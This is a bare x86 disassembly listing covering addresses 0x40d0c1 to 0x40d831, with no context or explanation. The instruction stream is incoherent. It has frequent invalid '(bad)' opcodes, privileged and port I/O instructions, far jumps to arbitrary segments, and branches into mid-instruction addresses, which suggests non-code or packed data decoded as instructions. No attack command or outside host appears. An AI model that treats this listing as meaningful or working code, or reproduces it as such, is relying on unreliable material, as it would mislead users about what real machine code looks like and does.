  40d0c1:	xor    esi,eax
  40d0c3:	dec    eax
  40d0c4:	fnstcw WORD PTR [edi-0x7c]
  40d0c7:	inc    esp
  40d0c8:	inc    ecx
  40d0c9:	(bad)  
  40d0ca:	test   al,0x13
  40d0cc:	pop    eax
  40d0cd:	dec    ebp
  40d0ce:	out    dx,al
  40d0cf:	cld    
  40d0d0:	repz inc ebx
  40d0d2:	out    dx,al
  40d0d3:	add    ax,0x6841
  40d0d7:	aas    
  40d0d8:	rol    DWORD PTR [ecx+0x5d],1
  40d0db:	dec    edi
  40d0dc:	xor    dh,bl
  40d0de:	loop   0x40d15d
  40d0e0:	in     al,0x2e
  40d0e2:	test   BYTE PTR [edi+0x27],dh
  40d0e5:	mov    edi,0xec7a448c
  40d0ea:	int3   
  40d0eb:	push   eax
  40d0ec:	inc    ebp
  40d0ed:	mov    ebx,0x716f21a3
  40d0f2:	ds loopne 0x40d089
  40d0f5:	mov    edi,0x2768f33
  40d0fa:	cmp    al,0xea
  40d0fc:	mov    bl,0x8a
  40d0fe:	and    al,BYTE PTR [eax+edi*2+0x3b]
  40d102:	dec    edi
  40d103:	mov    edi,0x1f3c1d0e
  40d108:	mov    cl,0x95
  40d10a:	pop    ss
  40d10b:	js     0x40d14f
  40d10d:	and    al,0xcd
  40d10f:	dec    esp
  40d110:	xor    eax,0xb9728e40
  40d115:	mov    DWORD PTR [ecx-0x6b],0xfaeacc0f
  40d11c:	inc    ebp
  40d11d:	mov    bl,0xaa
  40d11f:	retf   
  40d120:	add    eax,0x51272f76
  40d125:	arpl   WORD PTR [ebx+0x5d],dx
  40d128:	call   0x784e0c03
  40d12d:	test   DWORD PTR [edx],0xf45afb11
  40d133:	(bad)  
  40d134:	push   ebx
  40d135:	mov    DWORD PTR es:[edx-0x26],0xb47e3a7c
  40d13d:	rcl    DWORD PTR [ecx+0x39bb843f],0x82
  40d144:	cmova  esi,DWORD PTR [ecx-0x45]
  40d148:	pop    es
  40d149:	xor    eax,0xda0e2b97
  40d14e:	(bad)  
  40d14f:	mov    ah,0xbf
  40d151:	xchg   ecx,eax
  40d152:	xor    bl,BYTE PTR [ecx-0x7a217d30]
  40d158:	fidiv  WORD PTR ds:0xcf0d3109
  40d15e:	das    
  40d15f:	mov    bl,0x74
  40d161:	xchg   edx,eax
  40d162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d163:	sub    eax,DWORD PTR [eax-0x644f8d20]
  40d169:	jecxz  0x40d104
  40d16b:	in     al,dx
  40d16c:	cmp    BYTE PTR [edx+esi*8+0x4f],bl
  40d170:	mov    esi,DWORD PTR [edx]
  40d172:	add    BYTE PTR [eax-0x7b4eb777],0xbb
  40d179:	repnz imul edi,DWORD PTR [edi-0x4d13e33d],0xffffffbf
  40d181:	push   eax
  40d182:	inc    ecx
  40d183:	(bad)  
  40d185:	cmp    DWORD PTR [edx],edi
  40d187:	sbb    dl,BYTE PTR [esi+0x15]
  40d18a:	adc    eax,0xeaf19e1
  40d18f:	and    al,bl
  40d191:	shr    edx,cl
  40d193:	pop    ss
  40d194:	imul   ecx,DWORD PTR [eax],0xbd7449be
  40d19a:	out    dx,al
  40d19b:	sbb    bl,BYTE PTR [edx]
  40d19d:	div    dh
  40d19f:	shl    DWORD PTR [esi+0x1e],1
  40d1a2:	call   0x6789:0x22081015
  40d1a9:	shl    ah,0x5c
  40d1ac:	and    DWORD PTR [edx+eiz*2+0x32],ecx
  40d1b0:	fbld   TBYTE PTR [edx]
  40d1b2:	popa   
  40d1b3:	sub    ebp,DWORD PTR [esi+0x65e9c83a]
  40d1b9:	sbb    al,0xeb
  40d1bb:	lods   al,BYTE PTR ds:[esi]
  40d1bc:	ror    BYTE PTR [edi-0x15],0xa2
  40d1c0:	cld    
  40d1c1:	fucomp st(7)
  40d1c3:	cmp    al,0x2e
  40d1c5:	icebp  
  40d1c6:	hlt    
  40d1c7:	lds    edx,FWORD PTR [edi-0x2a]
  40d1ca:	pusha  
  40d1cb:	sahf   
  40d1cc:	cmp    eax,0xe33fc341
  40d1d1:	mov    eax,ds:0x73ba7e17
  40d1d6:	and    DWORD PTR [ebx-0xd],ebx
  40d1d9:	mov    ch,0xc3
  40d1db:	mov    bl,0x85
  40d1dd:	adc    bh,BYTE PTR [ecx-0x3c]
  40d1e0:	dec    ebx
  40d1e1:	xor    BYTE PTR [edi-0x72],bl
  40d1e4:	in     al,dx
  40d1e5:	daa    
  40d1e6:	jmp    0x40d235
  40d1e8:	mov    ecx,0x9ad54c8a
  40d1ed:	loop   0x40d196
  40d1ef:	or     al,BYTE PTR [ecx]
  40d1f1:	mov    dh,BYTE PTR [ecx-0xd]
  40d1f4:	and    eax,0x373761c0
  40d1f9:	xor    eax,0x1ed0ee72
  40d1fe:	dec    esp
  40d1ff:	xlat   BYTE PTR ds:[ebx]
  40d200:	jle    0x40d280
  40d202:	in     eax,dx
  40d203:	inc    edi
  40d204:	cmp    al,BYTE PTR [ecx]
  40d206:	dec    edx
  40d207:	mov    dh,0x6d
  40d209:	or     cl,ch
  40d20b:	int3   
  40d20c:	imul   ebx,DWORD PTR ds:0xe65e2e51,0x5b
  40d213:	daa    
  40d214:	xchg   esp,eax
  40d215:	ret    0x70dc
  40d218:	jmp    0x40d1c8
  40d21a:	add    BYTE PTR [edi],al
  40d21c:	loop   0x40d1a8
  40d21e:	and    DWORD PTR [ebx+0x32b196fd],edx
  40d224:	dec    eax
  40d225:	test   BYTE PTR [edi-0x34507171],bh
  40d22b:	gs mov ebp,0x38f99400
  40d231:	pop    ebp
  40d232:	inc    edi
  40d233:	fisttp QWORD PTR [eax]
  40d235:	push   es
  40d236:	fcomp  DWORD PTR [ebp-0x27]
  40d239:	bound  ebp,QWORD PTR [eax-0x4e]
  40d23c:	xor    eax,0x549f3a97
  40d241:	pop    ebx
  40d242:	xchg   ebx,eax
  40d243:	jb     0x40d1e4
  40d245:	xor    DWORD PTR [esi+0x627fa83a],esi
  40d24b:	cwde   
  40d24c:	pop    eax
  40d24d:	(bad)  
  40d24e:	scas   eax,DWORD PTR es:[edi]
  40d24f:	outs   dx,BYTE PTR ds:[esi]
  40d250:	lods   eax,DWORD PTR ds:[esi]
  40d251:	retf   0xac60
  40d254:	mov    cs,edx
  40d256:	psllq  mm5,QWORD PTR [ebp-0x6c]
  40d25a:	lods   eax,DWORD PTR ds:[esi]
  40d25b:	inc    edi
  40d25c:	jge    0x40d201
  40d25e:	jecxz  0x40d248
  40d260:	push   ds
  40d261:	sub    DWORD PTR [ebx],edi
  40d263:	and    bl,BYTE PTR [ebx+0x768f5729]
  40d269:	sub    DWORD PTR [ebx-0x45],ebp
  40d26c:	pop    ss
  40d26d:	mov    eax,ds:0x88c7d945
  40d272:	inc    edx
  40d273:	jbe    0x40d285
  40d275:	mov    bl,0x82
  40d277:	lea    eax,[ebp+edx*8-0x2e]
  40d27b:	adc    DWORD PTR [edi+0xa43b962],eax
  40d281:	add    eax,0xb9b9c6f5
  40d286:	ss push ebx
  40d288:	je     0x40d249
  40d28a:	and    al,0x6f
  40d28c:	mov    ebx,0x164e1aef
  40d291:	fs jo  0x40d22a
  40d294:	sub    al,0xd5
  40d296:	shl    DWORD PTR [ebp+0x2f],1
  40d299:	cmp    eax,DWORD PTR ds:0x6bd59df0
  40d29f:	add    dl,BYTE PTR [edx-0x4b]
  40d2a2:	ins    BYTE PTR es:[edi],dx
  40d2a3:	adc    bh,dh
  40d2a5:	pop    edx
  40d2a6:	jmp    0x8447d6a8
  40d2ab:	and    ebp,edi
  40d2ad:	mov    bl,0xb3
  40d2af:	and    BYTE PTR [edi],dh
  40d2b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2b2:	out    0x72,al
  40d2b4:	out    0xf6,eax
  40d2b6:	dec    edx
  40d2b7:	and    dh,BYTE PTR [edx+edi*4]
  40d2ba:	jle    0x40d241
  40d2bc:	inc    edx
  40d2bd:	rol    BYTE PTR [eax],cl
  40d2bf:	popf   
  40d2c0:	push   ds
  40d2c1:	test   DWORD PTR [ebx],ebp
  40d2c3:	inc    ebp
  40d2c4:	lea    ebp,[edx-0x490e853f]
  40d2ca:	inc    esp
  40d2cb:	in     al,0xc6
  40d2cd:	mov    ah,0x2f
  40d2cf:	ret    0x1ee4
  40d2d2:	mov    ebx,0x98524014
  40d2d7:	pop    DWORD PTR ds:0x9fdbf8d3
  40d2dd:	mov    ds:0x79ed43ee,al
  40d2e2:	pop    ebp
  40d2e3:	and    ebx,DWORD PTR [edx+0x25c0555d]
  40d2e9:	jae    0x40d2d9
  40d2eb:	and    ebx,DWORD PTR [ebx]
  40d2ed:	pop    ecx
  40d2ee:	(bad)  
  40d2ef:	repnz push 0xffffffef
  40d2f2:	and    edi,DWORD PTR [edi]
  40d2f4:	push   0xf6c93bb2
  40d2f9:	xchg   ebx,eax
  40d2fa:	cld    
  40d2fb:	sub    esi,edx
  40d2fd:	fmul   st(0),st
  40d2ff:	leave  
  40d300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d301:	jb     0x40d2cb
  40d303:	das    
  40d304:	mov    edi,0xf7b0585d
  40d309:	sbb    BYTE PTR [eax+0x7b],bl
  40d30c:	jns    0x40d344
  40d30e:	pop    ds
  40d30f:	cli    
  40d310:	(bad)  
  40d312:	cmp    ebp,DWORD PTR [ecx]
  40d314:	add    ebx,ebx
  40d316:	scas   eax,DWORD PTR es:[edi]
  40d317:	jns    0x40d2af
  40d319:	pop    esp
  40d31a:	dec    ebx
  40d31b:	sbb    BYTE PTR [eax-0x78],bl
  40d31e:	dec    edi
  40d31f:	add    esp,edx
  40d321:	rcl    bl,1
  40d323:	out    dx,eax
  40d324:	and    al,0x41
  40d326:	inc    edx
  40d327:	ror    DWORD PTR [ebx+0x744f519e],1
  40d32d:	(bad)  
  40d32e:	push   0xa9c19eed
  40d333:	inc    ebp
  40d334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d335:	out    0x8d,eax
  40d337:	scas   eax,DWORD PTR es:[edi]
  40d338:	in     al,dx
  40d339:	pop    ds
  40d33a:	pop    ss
  40d33b:	or     ch,BYTE PTR [edx+0x2f]
  40d33e:	popa   
  40d33f:	loop   0x40d2fe
  40d341:	sti    
  40d342:	inc    edx
  40d343:	mov    edi,0x40bca99b
  40d348:	pop    edi
  40d349:	push   0xffffff81
  40d34b:	lods   al,BYTE PTR ds:[esi]
  40d34c:	lods   al,BYTE PTR ds:[esi]
  40d34d:	ror    DWORD PTR [esp+edi*1],0xfc
  40d351:	pop    esi
  40d352:	mov    ecx,DWORD PTR [ecx+eax*4]
  40d355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d356:	jl     0x40d3aa
  40d358:	xor    esp,DWORD PTR [edx+0x6a]
  40d35b:	dec    edi
  40d35c:	pop    ds
  40d35d:	bound  ecx,QWORD PTR [ebp+ecx*1-0x54]
  40d361:	das    
  40d362:	mov    ds:0x8e7a4250,eax
  40d367:	inc    eax
  40d368:	jmp    0x8fd53330
  40d36d:	inc    eax
  40d36e:	iret   
  40d36f:	jge    0x40d3c0
  40d371:	xor    al,0xbc
  40d373:	push   0x2400d880
  40d378:	inc    eax
  40d379:	leave  
  40d37a:	imul   edx,DWORD PTR [edx+0x38a325c0],0x75
  40d381:	call   0x6e10:0xfc1ad845
  40d388:	cmc    
  40d389:	rcl    BYTE PTR [edi],0x7
  40d38c:	pop    eax
  40d38d:	ror    BYTE PTR ds:0xc1d1f0de,0x7a
  40d394:	loope  0x40d346
  40d396:	dec    edx
  40d397:	pop    ss
  40d398:	inc    eax
  40d399:	pusha  
  40d39a:	mov    esi,0x7ed75077
  40d39f:	nop
  40d3a0:	test   eax,0xcbe2a82c
  40d3a5:	sbb    esi,DWORD PTR [ebx+ebp*8-0x35e95483]
  40d3ac:	sbb    eax,0x4428a712
  40d3b1:	je     0x40d3ca
  40d3b3:	iret   
  40d3b4:	into   
  40d3b5:	push   ebx
  40d3b6:	lock add bh,BYTE PTR ss:[esi]
  40d3ba:	mov    ebx,DWORD PTR [edx-0x1d8ff68a]
  40d3c0:	xchg   esi,eax
  40d3c1:	fs push 0xffffff9b
  40d3c4:	test   DWORD PTR [esi+ebp*4],esp
  40d3c7:	fnstenv [edi-0x60]
  40d3ca:	ds pop esi
  40d3cc:	mov    DWORD PTR [edx-0x238e2945],ebp
  40d3d2:	xchg   ecx,eax
  40d3d3:	fild   QWORD PTR [ecx-0x44]
  40d3d6:	imul   edi,DWORD PTR [ebp+0x13],0x1f62694d
  40d3dd:	outs   dx,DWORD PTR ds:[esi]
  40d3de:	push   edi
  40d3df:	int3   
  40d3e0:	push   esi
  40d3e1:	dec    ebp
  40d3e2:	xor    ebx,DWORD PTR ds:0x2c2df9b7
  40d3e8:	mov    DWORD PTR [ebx-0x7a],ebp
  40d3eb:	ret    0xa0c3
  40d3ee:	pop    es
  40d3ef:	jb     0x40d395
  40d3f1:	jp     0x40d3ae
  40d3f3:	retf   0x1d4d
  40d3f6:	add    ch,dh
  40d3f8:	adc    ecx,eax
  40d3fa:	add    esp,DWORD PTR [ecx]
  40d3fc:	fisub  DWORD PTR [edx+0x10]
  40d3ff:	dec    eax
  40d400:	gs pop ecx
  40d403:	pop    eax
  40d404:	or     eax,0xe5375c67
  40d409:	pop    ss
  40d40a:	cmp    cl,BYTE PTR [ebx+ebp*1]
  40d40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d40e:	call   0xc47b:0x317dfa67
  40d415:	pop    esp
  40d416:	retf   
  40d417:	mov    ds:0x19558a0a,al
  40d41c:	(bad)
  40d41f:	inc    edx
  40d420:	push   edx
  40d421:	mov    DWORD PTR [edx+0x60],eax
  40d424:	adc    DWORD PTR [edi-0x31],eax
  40d427:	or     al,0xce
  40d429:	push   ecx
  40d42a:	add    DWORD PTR [ecx+0x47],0xffffffcc
  40d42e:	in     eax,dx
  40d42f:	pushf  
  40d430:	ficomp WORD PTR [ebp+0x2a]
  40d433:	inc    ebp
  40d434:	xor    eax,0xd9ceb398
  40d439:	dec    ebx
  40d43a:	js     0x40d47b
  40d43c:	sti    
  40d43d:	pop    esi
  40d43e:	aam    0xb1
  40d440:	retf   
  40d441:	or     al,0xc3
  40d443:	int3   
  40d444:	imul   edx,DWORD PTR [edx+0x5a81bf5],0xafdcf4ab
  40d44e:	jno    0x40d464
  40d450:	jmp    0x388:0xc4354cb9
  40d457:	adc    DWORD PTR [eax+0x6e],ebp
  40d45a:	shr    bh,0xf2
  40d45d:	cwde   
  40d45e:	inc    eax
  40d45f:	iret   
  40d460:	enter  0x9800,0x0
  40d464:	cdq    
  40d465:	rcl    DWORD PTR [edx+0x10],1
  40d468:	test   al,0xdd
  40d46a:	(bad)  
  40d46b:	test   al,0x8f
  40d46d:	ja     0x40d416
  40d46f:	pop    esi
  40d470:	push   ds
  40d471:	aaa    
  40d472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d473:	je     0x40d44e
  40d475:	inc    esp
  40d476:	stos   BYTE PTR es:[edi],al
  40d477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d478:	push   edi
  40d479:	fidiv  DWORD PTR [eax-0xc]
  40d47c:	xor    dl,BYTE PTR [edi-0x9]
  40d47f:	lods   eax,DWORD PTR ds:[esi]
  40d480:	cmp    al,0x80
  40d482:	cmp    bl,BYTE PTR ds:0xe268ae51
  40d488:	adc    BYTE PTR [ecx+0x3a],ah
  40d48b:	je     0x40d4c7
  40d48d:	sub    DWORD PTR [edx+0x17549789],0x54
  40d494:	mov    ch,0xe
  40d496:	or     esi,DWORD PTR [edx]
  40d498:	push   esp
  40d499:	jmp    0xd18:0xde28cb61
  40d4a0:	add    DWORD PTR [edi+0x52],0x20f7849
  40d4a7:	call   0x54a2:0x4613ea07
  40d4ae:	ja     0x40d43e
  40d4b0:	and    DWORD PTR [ecx+0x6],0x7d
  40d4b4:	cli    
  40d4b5:	leave  
  40d4b6:	dec    edi
  40d4b7:	add    ebp,esp
  40d4b9:	jno    0x40d4b5
  40d4bb:	add    eax,0xeda86eed
  40d4c0:	inc    ecx
  40d4c1:	or     BYTE PTR [eax+edi*8+0x4c],ah
  40d4c5:	in     al,0x41
  40d4c7:	xor    al,0x6f
  40d4c9:	pop    es
  40d4ca:	rol    BYTE PTR [ebx-0x6fff73d5],cl
  40d4d0:	jmp    0x1a2614f6
  40d4d5:	ss dec esp
  40d4d7:	sub    DWORD PTR [ebp-0x6e4f3698],edx
  40d4dd:	js     0x40d556
  40d4df:	mov    al,0xbe
  40d4e1:	inc    edx
  40d4e2:	or     al,0xe
  40d4e4:	jae    0x40d4ca
  40d4e6:	pop    ebp
  40d4e7:	addr16 test ecx,eax
  40d4ea:	and    ebp,ebx
  40d4ec:	or     al,0xcf
  40d4ee:	jge    0x40d4ab
  40d4f0:	sar    BYTE PTR [ecx],cl
  40d4f2:	mov    ebx,0xca7d67af
  40d4f7:	in     al,0x5b
  40d4f9:	or     eax,0x2fdd74c8
  40d4fe:	dec    esi
  40d4ff:	enter  0xb993,0xd0
  40d503:	cs test eax,0xb869ceaa
  40d509:	mov    bh,0xdd
  40d50b:	adc    BYTE PTR [edi-0x54323f59],0x3a
  40d512:	ss int3 
  40d514:	pxor   mm3,mm7
  40d517:	lds    ebp,FWORD PTR [edi]
  40d519:	xor    BYTE PTR [esi],0x5c
  40d51c:	add    ch,BYTE PTR [ecx+0x59]
  40d51f:	sahf   
  40d520:	jge    0x40d544
  40d522:	jle    0x40d553
  40d524:	or     dh,BYTE PTR [esi-0x4c96f46d]
  40d52a:	sti    
  40d52b:	mov    edi,0x3a6765b0
  40d530:	dec    edx
  40d531:	mov    edi,0x2d3763a4
  40d536:	cmp    al,0x22
  40d538:	dec    eax
  40d539:	push   cs
  40d53a:	mov    edi,0x10910787
  40d53f:	outs   dx,DWORD PTR ds:[esi]
  40d540:	sahf   
  40d541:	inc    ecx
  40d542:	dec    ebx
  40d543:	add    BYTE PTR [edi+0x72f6468e],dl
  40d549:	xor    eax,0xa9280959
  40d54e:	mov    eax,0xeca3eada
  40d553:	or     BYTE PTR [edx],0x72
  40d556:	adc    DWORD PTR [edi],edx
  40d558:	adc    al,0x80
  40d55a:	sub    ecx,DWORD PTR ds:0xc6698a9d
  40d560:	xchg   BYTE PTR gs:[esi+0x58],dh
  40d564:	mov    eax,ds:0xa42f7cbf
  40d569:	iret   
  40d56a:	adc    esp,DWORD PTR [esi+0x35a8f75d]
  40d570:	jo     0x40d503
  40d572:	mov    al,0x6d
  40d574:	js     0x40d5a8
  40d576:	sar    BYTE PTR [ecx],0x48
  40d579:	mov    cl,dl
  40d57b:	iret   
  40d57c:	scas   eax,DWORD PTR es:[edi]
  40d57d:	out    0x75,al
  40d57f:	iret   
  40d580:	push   ebx
  40d581:	mov    eax,DWORD PTR ds:0x32025d30
  40d587:	pop    ebp
  40d588:	mov    eax,ds:0xf91c1d12
  40d58d:	add    al,0x59
  40d58f:	jg     0x40d532
  40d591:	lods   eax,DWORD PTR ds:[esi]
  40d592:	jecxz  0x40d597
  40d594:	dec    edi
  40d595:	popf   
  40d596:	fwait
  40d597:	xchg   ebp,eax
  40d598:	inc    ebp
  40d599:	inc    edx
  40d59a:	cmp    ecx,DWORD PTR [edx+0x37626bf6]
  40d5a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5a1:	mov    al,bl
  40d5a3:	xor    eax,0x63522525
  40d5a8:	std    
  40d5a9:	scas   al,BYTE PTR es:[edi]
  40d5aa:	sahf   
  40d5ab:	xchg   edi,eax
  40d5ac:	adc    dh,BYTE PTR [edx-0x7e93b6b8]
  40d5b2:	loopne 0x40d595
  40d5b4:	mov    eax,0x51a55b57
  40d5b9:	iret   
  40d5ba:	lods   al,BYTE PTR ds:[esi]
  40d5bb:	int3   
  40d5bc:	jnp    0x40d5d8
  40d5be:	hlt    
  40d5bf:	jnp    0x40d5fc
  40d5c1:	mov    ecx,0x40b471e5
  40d5c6:	adc    eax,0x8e48e471
  40d5cb:	outs   dx,DWORD PTR gs:[esi]
  40d5cd:	sahf   
  40d5ce:	add    ebx,DWORD PTR [edi-0x7a8ab0e3]
  40d5d4:	inc    eax
  40d5d5:	repz sahf 
  40d5d7:	pusha  
  40d5d8:	daa    
  40d5d9:	jb     0x40d64e
  40d5db:	retf   
  40d5dc:	lds    ebx,FWORD PTR [ebx]
  40d5de:	enter  0xfc9a,0x14
  40d5e2:	dec    ebp
  40d5e3:	into   
  40d5e4:	cwde   
  40d5e5:	and    eax,esi
  40d5e7:	ficomp DWORD PTR [ecx+0x58]
  40d5ea:	ror    DWORD PTR [edx+0xa],cl
  40d5ed:	adc    bh,BYTE PTR [eax]
  40d5ef:	push   0xa76d397c
  40d5f4:	bound  eax,QWORD PTR [ebx+0x3e]
  40d5f7:	sbb    esp,DWORD PTR [ecx+0x25c8aabb]
  40d5fd:	adc    DWORD PTR [edi],ecx
  40d5ff:	lods   eax,DWORD PTR ds:[esi]
  40d600:	sti    
  40d601:	mov    esi,cr4
  40d604:	add    al,0x82
  40d606:	loope  0x40d668
  40d608:	mov    dl,0x73
  40d60a:	xchg   DWORD PTR [edi],esp
  40d60c:	outs   dx,BYTE PTR ds:[esi]
  40d60d:	mov    ebx,DWORD PTR [ecx+0x7c]
  40d610:	mov    ch,0x2f
  40d612:	pop    es
  40d613:	push   edi
  40d614:	mov    esp,0xe964692d
  40d619:	push   ebp
  40d61a:	cs in  al,0x75
  40d61d:	imul   esi,DWORD PTR [edx-0x48242b06],0xffffffb2
  40d624:	jmp    0xacd7:0x23aa71fb
  40d62b:	ins    BYTE PTR es:[edi],dx
  40d62c:	test   al,bh
  40d62e:	pusha  
  40d62f:	sbb    esi,DWORD PTR [ebx+ebp*8+0x7e09578a]
  40d636:	jecxz  0x40d6ae
  40d638:	xor    DWORD PTR [ebx-0x21],eax
  40d63b:	xchg   ecx,eax
  40d63c:	jb     0x40d65e
  40d63e:	xor    BYTE PTR ds:0x7d33c218,cl
  40d644:	xlat   BYTE PTR ds:[ebx]
  40d645:	adc    dh,ah
  40d647:	pop    ebp
  40d648:	retf   
  40d649:	mov    bl,0xd3
  40d64b:	(bad)  
  40d64c:	in     al,0x33
  40d64e:	jge    0x40d694
  40d650:	and    al,0x4
  40d652:	cmp    eax,0x6f6f52cd
  40d657:	(bad)  [edi+0x17cc5f86]
  40d65d:	retf   0x72de
  40d660:	sub    al,BYTE PTR fs:[ecx+0x67]
  40d664:	xchg   edx,eax
  40d665:	fmul   st(1),st
  40d667:	or     cl,0xca
  40d66a:	pop    es
  40d66b:	xor    ecx,DWORD PTR [edi-0x4b]
  40d66e:	lock outs dx,DWORD PTR ds:[esi]
  40d670:	xor    DWORD PTR [ecx+edx*4-0x48cf8b35],esp
  40d677:	sub    eax,0x3a0f0b9e
  40d67c:	mov    dl,BYTE PTR [esi+0x74]
  40d67f:	pop    es
  40d680:	adc    eax,0xea6b7552
  40d685:	cs add eax,eax
  40d688:	xchg   ebx,eax
  40d689:	xor    eax,0x755d619c
  40d68e:	ins    DWORD PTR es:[edi],dx
  40d68f:	dec    edi
  40d690:	or     al,BYTE PTR [ebx]
  40d692:	retf   0xc8c3
  40d695:	cmp    al,0xe6
  40d697:	mov    ecx,eax
  40d699:	imul   esp,esp,0xe59fef52
  40d69f:	popa   
  40d6a0:	or     DWORD PTR [ebx],ebx
  40d6a2:	xchg   ecx,eax
  40d6a3:	(bad)  
  40d6a4:	dec    ebx
  40d6a5:	jbe    0x40d6a8
  40d6a7:	cs push ebp
  40d6a9:	in     al,0xdf
  40d6ab:	ror    DWORD PTR [esi],1
  40d6ad:	in     eax,0x5b
  40d6af:	in     eax,dx
  40d6b0:	push   ecx
  40d6b1:	pop    esi
  40d6b2:	jle    0x40d6a5
  40d6b4:	push   0xffffff97
  40d6b6:	lods   al,BYTE PTR ds:[esi]
  40d6b7:	add    eax,0x6e1b02ed
  40d6bc:	mov    gs,WORD PTR [ebp-0xa24f89c]
  40d6c2:	pop    ebx
  40d6c3:	adc    eax,0x3312c66c
  40d6c8:	pusha  
  40d6c9:	ss cmp ecx,0xffffffae
  40d6cd:	imul   esp,DWORD PTR [edi],0x2
  40d6d0:	sbb    bh,BYTE PTR [ebp-0x23]
  40d6d3:	xchg   esi,eax
  40d6d4:	mov    eax,0xd51f53cc
  40d6d9:	jge    0x40d670
  40d6db:	mov    ?,WORD PTR [ebp+0x6f4b6dc8]
  40d6e1:	retf   0xeda
  40d6e4:	add    al,0xdd
  40d6e6:	mov    ecx,0xa91d428e
  40d6eb:	and    al,BYTE PTR [eax+0x6d]
  40d6ee:	push   eax
  40d6ef:	dec    edx
  40d6f0:	call   0x3e2a:0xf973df72
  40d6f7:	or     DWORD PTR [edx+ecx*4],ecx
  40d6fa:	jmp    0x40d72c
  40d6fc:	jge    0x40d6c6
  40d6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6ff:	aam    0xf8
  40d701:	sti    
  40d702:	out    0xd2,eax
  40d704:	push   eax
  40d705:	and    esi,DWORD PTR ds:0x9323edbb
  40d70b:	xlat   BYTE PTR cs:[ebx]
  40d70d:	dec    ebp
  40d70e:	popf   
  40d70f:	pop    ebp
  40d710:	out    0xe7,al
  40d712:	inc    esi
  40d713:	mov    eax,0x586fba4b
  40d718:	pop    es
  40d719:	inc    ecx
  40d71a:	push   esp
  40d71b:	xlat   BYTE PTR ds:[ebx]
  40d71c:	xchg   ebx,eax
  40d71d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d71e:	adc    esp,esp
  40d720:	(bad)  
  40d721:	ins    BYTE PTR es:[edi],dx
  40d722:	shr    BYTE PTR [ebx+0x26],0x1b
  40d726:	shr    BYTE PTR [edx+edi*8],0xc2
  40d72a:	(bad)  
  40d72c:	or     eax,0x84238052
  40d731:	push   eax
  40d733:	ja     0x40d70e
  40d735:	xchg   sp,ax
  40d737:	jge    0x40d6de
  40d739:	je     0x40d6f3
  40d73b:	pop    ebp
  40d73c:	fnstsw WORD PTR [eax+0x51]
  40d73f:	mov    bl,0x2a
  40d741:	jae    0x40d789
  40d743:	daa    
  40d744:	jmp    0x7f2be802
  40d749:	mov    ds:0x30ee7380,eax
  40d74e:	fsubr  st(6),st
  40d750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d751:	ret    
  40d752:	out    dx,eax
  40d753:	push   edi
  40d754:	lock jnp 0x40d72b
  40d757:	xor    esi,DWORD PTR [ecx-0x8b1da9f]
  40d75d:	cld    
  40d75e:	adc    cl,BYTE PTR [esp+esi*8-0x9]
  40d762:	push   ebp
  40d763:	(bad)  
  40d764:	aam    0xe3
  40d766:	int3   
  40d767:	add    ah,BYTE PTR [edx+0x11]
  40d76a:	xchg   esi,eax
  40d76b:	pop    ss
  40d76c:	inc    esp
  40d76d:	mov    esi,0x4e0f02f8
  40d772:	ss inc eax
  40d774:	sbb    bh,BYTE PTR [edi]
  40d776:	xor    eax,0xc955d5ff
  40d77b:	icebp  
  40d77c:	scas   al,BYTE PTR es:[edi]
  40d77d:	(bad)  
  40d77e:	fs je  0x40d733
  40d781:	jg     0x40d802
  40d783:	fisub  WORD PTR [edi+edx*1+0x1d891df8]
  40d78a:	adc    ebx,DWORD PTR [ecx+0x1b]
  40d78d:	jo     0x40d7b4
  40d78f:	shl    DWORD PTR [ebp+0x58],1
  40d792:	ins    DWORD PTR es:[edi],dx
  40d793:	stos   BYTE PTR es:[edi],al
  40d794:	dec    eax
  40d795:	ds (bad) 
  40d797:	pop    ebx
  40d798:	mov    ecx,0xc5d8f8b5
  40d79d:	push   ecx
  40d79e:	xor    ch,BYTE PTR [esi+0x1067dff]
  40d7a4:	lods   al,BYTE PTR ds:[esi]
  40d7a5:	push   eax
  40d7a6:	mov    al,ds:0x45d3338e
  40d7ab:	es pop ss
  40d7ad:	call   FWORD PTR [esp+edi*2]
  40d7b0:	mov    eax,0xf53f467e
  40d7b5:	imul   edx,DWORD PTR [eax-0x4150d336],0x5272936e
  40d7bf:	ret    0x9171
  40d7c2:	push   cs
  40d7c3:	ror    BYTE PTR [edi+0x13a569f7],0x3d
  40d7ca:	sub    DWORD PTR [ebx+ebp*8-0x4b],edx
  40d7ce:	adc    DWORD PTR [ebp-0x68],0x982fe692
  40d7d5:	mov    eax,ds:0xa6004149
  40d7da:	ret    
  40d7db:	xchg   edi,eax
  40d7dc:	popa   
  40d7dd:	inc    ebx
  40d7de:	sar    BYTE PTR [esi-0x6bd73a62],cl
  40d7e4:	mov    ebx,0xb732eb97
  40d7e9:	fsub   st,st(4)
  40d7eb:	imul   DWORD PTR [edx+0x704b07b7]
  40d7f1:	mov    bl,0x4e
  40d7f3:	stos   BYTE PTR es:[edi],al
  40d7f4:	fld    DWORD PTR [ecx-0x5a6884b4]
  40d7fa:	adc    BYTE PTR [ebx+esi*1+0x1700a44a],ch
  40d801:	lods   eax,DWORD PTR ds:[esi]
  40d802:	in     eax,dx
  40d803:	daa    
  40d804:	ins    BYTE PTR es:[edi],dx
  40d805:	mov    bl,0xaa
  40d807:	xchg   BYTE PTR [edx-0x17b9576e],bl
  40d80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d80e:	out    dx,al
  40d80f:	or     edx,ebp
  40d811:	call   0x8f429f21
  40d816:	mov    eax,ds:0xc74de43b
  40d81b:	loope  0x40d838
  40d81d:	jge    0x40d7a8
  40d81f:	frstor [esi+ebx*4-0xfe660f0]
  40d826:	fcmovnu st,st(7)
  40d828:	xlat   BYTE PTR ds:[ebx]
  40d829:	aam    0x8d
  40d82b:	adc    eax,0x1ccc6299
  40d830:	sahf   
  40d831:	(bad)  
